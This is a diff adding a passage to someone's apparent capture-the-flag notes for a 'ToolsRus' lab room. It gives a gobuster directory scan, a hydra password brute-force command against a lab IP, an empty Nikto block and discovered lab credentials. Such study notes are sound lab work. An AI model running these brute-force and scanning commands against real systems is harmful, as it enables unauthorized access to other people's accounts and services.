@@ -44,3 +44,24 @@ Inspect element for /ctf/getcookie, then under "storage"
 curl -b "flagpls=flagpls" http://IP:8081/ctf/sendcookie
 ```
 
+## ToolsRus
+
+### Task 1 ToysRus
+
+To find directories
+```
+gobuster dir -u http://IP:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+```
+
+To find Bob's password
+```
+hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.10.219.157 http-get /protected
+```
+
+Using Nikto with creds
+```
+
+```
+
+username=tomcat
+password = s3cret
